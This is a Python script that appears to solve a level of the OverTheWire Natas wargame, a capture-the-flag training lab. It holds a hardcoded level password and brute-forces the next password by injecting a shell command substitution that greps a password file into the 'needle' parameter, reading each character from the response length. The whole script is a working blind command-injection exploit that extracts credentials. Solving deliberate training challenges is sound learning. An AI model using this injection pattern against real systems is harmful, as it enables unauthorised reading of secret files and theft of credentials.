import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas16.natas.labs.overthewire.org/"
characters = ascii_uppercase + ascii_lowercase + digits

session = requests.Session()
session.auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

password = ""

while len(password) < 33:
    for character in characters:
        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + character)}
        request = session.get('http://natas16.natas.labs.overthewire.org/', params=payload)

        if len(request.text) == 1105:
            sys.stdout.write(character)
            sys.stdout.flush()
            password += character
            break

print(password)

